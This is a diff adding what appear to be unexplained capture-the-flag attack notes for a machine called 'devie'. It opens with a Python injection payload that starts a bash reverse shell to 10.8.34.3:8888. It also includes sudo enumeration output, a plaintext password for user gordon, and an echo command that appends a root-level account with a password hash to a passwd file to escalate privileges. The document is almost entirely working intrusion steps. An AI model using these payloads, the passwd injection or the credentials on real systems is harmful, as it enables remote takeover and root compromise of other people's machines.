@@ -1,0 +1,28 @@
+__import__('os').system('bash -c "bash -i >& /dev/tcp/10.8.34.3/8888 0>&1"')#
+
+bruce@devie:~$ sudo -l
+Matching Defaults entries for bruce on devie:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bruce may run the following commands on devie:
+    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
+
+
+root         611  0.0  0.0   6816  2940 ?        Ss   07:32   0:00 /usr/sbin/cron -f
+root         622  0.0  0.0   8480  3408 ?        S    07:32   0:00  _ /usr/sbin/CRON
+
+
+bruce        689  0.0  0.0   2608   592 ?        Ss   07:32   0:00      _ /bin/sh -c /usr/bin/python3 /var/www/math/app.py    
+
+
+
+/home/bruce/note
+
+gordon  :  G0th@mR0ckz!
+
+
+echo "hanhctf:\$6\$eEZqqrBwHGHO/Xun\$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.:0:0:hanhctf:/hanhctf:/bin/bash" >> /home/gordon/reports/passwd
+
+$6$eEZqqrBwHGHO/Xun$TcuLtBIraRYkI8gHx4uhV.zyiGapYMZzT02PI4STnSNM8HjNzutZg/vkkbf70I3kpIzaLn9QlPXsnLvTiXRDM.
+
+
